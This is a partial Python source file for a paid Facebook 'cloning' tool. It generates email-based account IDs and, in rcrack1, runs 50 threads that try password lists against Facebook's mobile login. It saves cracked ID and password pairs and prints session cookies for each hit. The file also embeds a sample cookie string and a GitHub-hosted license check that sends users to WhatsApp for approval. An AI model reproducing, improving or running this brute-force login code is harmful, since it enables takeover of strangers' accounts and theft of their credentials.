...
####
logo = ("""\033[1;32m
\033[1;92m  ________   ______   __    __   ______   ______  __    __ 
\033[1;92m |        \ /      \ |  \  |  \ /      \ |      \|  \  |  \
\033[1;95m\$$$$$$$$|  $$$$$$\| $$  | $$|  $$$$$$\ \$$$$$$| $$\ | $$
\033[1;95m   | $$   | $$__| $$| $$__| $$| $$___\$$  | $$  | $$$\| $$
\033[1;95m   | $$   | $$    $$| $$    $$ \$$    \   | $$  | $$$$\ $$
...
\033[1;32m══════════════════════════════════════════════════════
\033[1;32m[💜]     \033[1;32mCREATED BY\33    :  \033[1;33mTAHSIN\33[0;m\033[1;32m
\033[1;32m[💜]     \033[1;32mFACEBOK      : \033[1;34m TAHSIN KING
\033[1;32m[💜]     \033[1;32mGITHUB       :  \033[1;35mTAHSIN_XD
\033[1;32m[💜]     \033[1;32mTOOL VIRSION :  \033[1;36m1.0
\033[1;32m[💜]    \033[1;32m TOOL TYPE    : \033[1;32m PAID
\033[1;92m══════════════════════════════════════════════════════""")
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        print(" \033[1;32m[1] RANDOM MAIL CLONING")
        print(" \033[1;33m[2] JOIN WHATSAPP")
        print(" \033[1;31m[0] Exit")
        TAHSIN =input("\033[1;36m[√] Choose : ")
        if TAHSIN in ["1", "01"]:
            v1()
        if TAHSIN in ["2", "02"]:
        	os.system(' xdg-open https://chat.whatsapp.com/01944417541 ')
        Main()
        if TAHSIN in [" 0", "00"]:
            exit()
        else:
...
def v1():
    ...
    print(' [📧] EXAMPLE DOAMIN : @gmail.com, @yahoo.com, etc ')
    doamin = input(' [✉️]  CHOSE DOAMIN  : ')
    limit = int(input('[••?] HOW MANY NUMBERS DO YOU WANT TO CLONE : '))
    ...
    with ThreadPool(max_workers=50) as yaari:
        ...
        print(logo)
        tl = str(len(user))
        print(' [🔥]\033[1;94m  TOTAL ID:\033[1;92m '+tl)
        print(f"\033[1;92m [🔥]  DOAMIN:\033[1;92m {doamin}")
        print(' \033[1;92m[🔥]  CLONING HAS BEEN STARTED')
        print('\033[1;32m═════════════════════════════════════════════════════')
        for guru in user:
    ...
    print(' [🙄] Ids saved in TAHSIN-EMAILok.txt,TAHSIN-EMAILcp.txt')
    print('\033[1;32m═════════════════════════════════════════════════════')
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[SEARCHING] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            ...
            header_freefb = {'authority': 'mbasic.facebook.com',
                ...
                # 'cookie': 'datr=dzDIY1JWhKg1HsOKwJ0qr1Qw; sb=dzDIYzrqq9c7Pf9bUYAWn3dF; m_pixel_ratio=1.8125; zsh=ASS0nGkh2eYeXkzf5gF5LUHD66NCNYGfCh9-BOAT7hu_IHu2kJJDRb-wDBBM38ALYrxEPIG0YdWHE_lG-pP5Tq49eOeCRsAEkNrl-0oOJ8_ViY05K6JiQHU6hhHopBMXgp3PXca7B7009RjGoVeiB-JmMujrhlkwK-F74VWSxJaFjomzFNveQ63ko_HOTY_4dJW9ZVATYZtGU6cIf5z2JFB5X3yc4vIcISfCDQCFDQiZKDVnPQATBRkB__XPtcNoR7TNfrISvLRimLORZrSOr0rqgQC0X_y9v-XPT62IZDOKvP7CL1t8QLqACj8KK03hEykDJUZ-5mHmA3U; wd=398x750; fr=0EyxHKwKL3nqqIis0..BjyDB3.WZ.AAA.0.0.BjyggC.AWWWkUsC9pU',
            ...
            if 'c_user' in log_cookies:
                ...
                print(f" [💉] Cookie : {coki}")
                open('/sdcard/TAHSIN-EMAILok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            else:
                continue
...
def TAHSIN():
  ...
  id = "=".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/emtcybertahsin/FUCK/main/Approved.txt').text
    if id in httpCaht:
      ...
      print("Your Token : "+id)
      print('\33[1;32m═════════════════════════════════════════════════════')
      print("\33[1;32mNOTE THIS TOOL IS PAID YOU NEED APPROVAL")
      print('\33[1;32m═════════════════════════════════════════════════════')
      print('\33[1;32mFB ID LINK > https://www.facebook.com/mdakash.ahamed.14')
      print('\33[1;32m═════════════════════════════════════════════════════')
      input('IF U NEED APPROVE THEN PRESS ENTER WHATS APP WILL OPEN ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801944417541?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
